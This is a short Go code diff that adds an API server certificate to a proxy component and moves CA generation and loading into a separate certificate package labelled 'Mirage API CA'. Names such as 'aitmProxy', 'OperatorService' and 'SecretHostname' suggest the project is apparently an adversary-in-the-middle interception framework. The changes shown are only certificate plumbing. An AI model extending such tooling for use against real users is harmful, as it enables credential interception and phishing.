@@ -332,6 +332,14 @@ func (ini *initializer) initProxy(version string) error {
 	if err != nil {
 		return err
 	}
+
+	apiServerCertPath := filepath.Join(ini.cfg.DataDir, "api-server.crt")
+	apiServerCert, err := clientCA.LoadOrIssueServerCert(apiServerCertPath, ini.cfg.API.SecretHostname)
+	if err != nil {
+		return fmt.Errorf("API server cert: %w", err)
+	}
+	aitmProxy.APICertificate = apiServerCert
+
 	// Operator service — must be created after the CA is available.
 	operatorStore := sqlite.NewOperatorStore(ini.db)
 	ini.operatorSvc = &aitm.OperatorService{
@@ -370,13 +378,13 @@ func loadConfig(path string) (*config.Config, error) {
 	return cfg, nil
 }
 
-func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
+func loadOrGenerateCA(certPath string, logger *slog.Logger) (*cert.CA, error) {
 	if _, err := os.Stat(certPath); os.IsNotExist(err) {
 		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
 			return nil, fmt.Errorf("creating CA directory: %w", err)
 		}
 
-		ca, err := api.GenerateCA(certPath)
+		ca, err := cert.GenerateCA(certPath, "Mirage API CA")
 		if err != nil {
 			return nil, fmt.Errorf("generating API CA: %w", err)
 		}
@@ -386,7 +394,7 @@ func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
 		return ca, nil
 	}
 
-	ca, err := api.Load(certPath)
+	ca, err := cert.LoadCA(certPath)
 	if err != nil {
 		return nil, fmt.Errorf("loading API CA: %w", err)
 	}
